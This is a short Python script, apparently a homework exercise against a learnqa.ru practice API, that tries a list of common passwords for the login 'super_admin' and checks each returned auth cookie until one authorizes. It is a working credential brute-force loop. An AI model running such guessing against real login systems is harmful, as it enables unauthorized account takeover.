import requests

url_get_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"

passwords = [
    "123456", "password", "12345678", "qwerty", "12345",
    "123456789", "1234", "1234567", "abc123", "911",
    "1234567890", "555555", "666666", "111111", "aaaaaa",
    "654321", "asdfghjkl", "123123", "abcdef", "password123",
    "12345678901", "112233", "121212", "azerty", "test1"
]

for password in passwords:
    payload = {"login": login, "password": password}
    response = requests.post(url_get_cookie, data=payload)
    auth_cookie = response.cookies.get("auth_cookie")

    if auth_cookie:
        cookies = {"auth_cookie": auth_cookie}
        response_check = requests.get(url_check_cookie, cookies=cookies)
        response_text = response_check.text

        if response_text == "You are authorized":
            print(f"Найден верный пароль: {password}")
            print(f"Ответ API: {response_text}")
            break
        else:
            print(f"Пароль '{password}' неверный. Ответ API: {response_text}")
    else:
        print(f"Ошибка при получении cookie для пароля '{password}'")